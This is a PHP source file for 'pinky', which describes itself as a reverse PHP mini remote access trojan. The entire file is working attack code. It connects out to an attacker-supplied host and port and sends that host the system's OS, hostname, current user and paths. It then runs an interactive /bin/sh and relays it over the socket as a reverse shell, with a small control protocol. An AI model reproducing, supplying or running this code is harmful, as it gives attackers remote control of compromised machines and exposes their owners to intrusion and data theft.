<?php
set_time_limit ( 0 );

$version = "0.1";
$author = "David Tavarez (davidtavarez)";
$url = "https://github.com/davidtavarez/pinky";

echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";

$bin = PHP_BINDIR;
$path = realpath ( NULL ) . '/';

if (isset ( $argv [1] ) == false) {
	exit ( "\nERROR: Server address not provided.\n\n" );
}

$address = $argv [1];
$port = isset ( $argv [2] ) ? $argv [2] : 3391;
$type = isset ( $argv [3] ) ? $argv [3] : 'tcp';

echo "\nTrying to connect... ";
$session = @stream_socket_client ( $type . '://' . $address . ':' . $port, $errno, $errstr, 30 );
if (! $session) {
	exit ( "ERROR: " . $errstr . "(" . $errno . ")\n" );
} else {
	echo "Connection stablished with \e[1m" . $type . "\e[0m://\e[1m" . $address . "\e[0m:\e[1m" . $port . "\e[0m/\n";
	// Send client information.
	echo "Sending client information...\n";
	// System
	stream_socket_sendto ( $session, php_uname ( 's' ) . ' ' . php_uname ( 'v' ) );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	// Machine
	stream_socket_sendto ( $session, php_uname ( 'm' ) );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	// Hostname
	stream_socket_sendto ( $session, php_uname ( 'n' ) );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	// Userser
	stream_socket_sendto ( $session, get_current_user () );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	// Bin Path
	stream_socket_sendto ( $session, $bin );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	// Client Path
	stream_socket_sendto ( $session, $path );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	
	// Start the session.
	echo "Session started.\n";
	
	$shell = '/bin/sh -i';
	$process = null;
	$process_status = null;
	$descriptorspec = array (
			array (
					'pipe',
					'r' 
			),
			array (
					'pipe',
					'w' 
			),
			array (
					'pipe',
					'w' 
			) 
	);
	
	$process = proc_open ( $shell, $descriptorspec, $pipes, $path, null );
	$process_status = proc_get_status ( $process );
	
	// Set everything to non-blocking
	stream_set_blocking ( $pipes [0], 0 );
	stream_set_blocking ( $pipes [1], 0 );
	stream_set_blocking ( $pipes [2], 0 );
	
	stream_set_blocking ( $session, 0 );
	
	while ( $session != false ) {
		$read = array (
				$session,
				$pipes [1],
				$pipes [2] 
		);
		$write = NULL;
		$except = NULL;
		
		stream_select ( $read, $write, $except, 0 );
		
		if (in_array ( $session, $read )) {
			$input = fread ( $session, 1024 );
			if (strlen ( $input ) > 0) {
				if (strpos ( $input, '--pinky-' ) === 0) {
					$command = strtolower ( substr ( $input, strlen ( '--pinky-' ) - strlen ( $input ) ) );
					switch ($command) {
						case 'stop' :
							stream_socket_sendto ( $session, 'OK' );
							echo "Closing session... ";
							stream_socket_shutdown ( $session, STREAM_SHUT_WR );
							fclose ( $session );
							fclose ( $pipes [0] );
							fclose ( $pipes [1] );
							fclose ( $pipes [2] );
							proc_close ( $process );
							$session = false;
							break;
						default :
							stream_socket_sendto ( $session, "ERROR: Command \e[1m" . $command . "\e[0m not found.\n" );
					}
				} else {
					fwrite ( $pipes [0], $input );
				}
			}
		}
		
		if (in_array ( $pipes [1], $read )) {
			fwrite( $session, fread ( $pipes [1], 1024 ) );
		}
		
		if (in_array ( $pipes [2], $read )) {
			fwrite( $session, fread ( $pipes [2], 1024 ));
		}
	}
}

echo "Done.\n\n";